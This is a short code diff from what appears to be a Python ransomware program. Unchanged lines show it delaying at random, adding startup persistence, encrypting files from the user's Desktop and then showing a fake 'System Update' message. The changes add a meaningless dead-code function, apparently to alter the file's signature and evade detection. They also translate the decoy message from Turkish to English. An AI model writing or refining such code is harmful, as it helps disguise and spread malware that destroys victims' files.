@@ -16,6 +16,9 @@ folders_path = [
     str(os.path.join(Path.home(), "Desktop"))
 
 ]
+def dead_code_1():
+    a = 1 + 2 * 3 / 4
+    return a ** 2 if a else None
 
 
 #def add_to_task_scheduler():
@@ -130,8 +133,9 @@ if __name__ == "__main__":
     time.sleep(random.randint(300, 1200))
     add_persistence_startup()
     encrypt_file()
+    dead_code_1()
     #add_to_task_scheduler()
     root = tk.Tk()
     root.withdraw()
-    messagebox.showinfo("Sistem Güncellemesi", "Güncelleme tamamlandı.")
+    messagebox.showinfo("System Update", "Update completed.")
     root.mainloop()
